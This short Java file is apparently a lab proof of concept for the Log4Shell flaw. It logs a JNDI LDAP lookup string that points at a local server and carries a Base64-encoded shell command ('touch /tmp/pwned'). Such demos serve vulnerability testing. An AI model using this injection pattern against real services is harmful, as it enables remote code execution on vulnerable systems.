package com.mak.log4jshell;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Application {

    private static final Logger logger = LogManager.getLogger(Application.class);

    public static void main(String[] args) {
        logger.error("Logging custom info : {}", "${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}");
    }
}
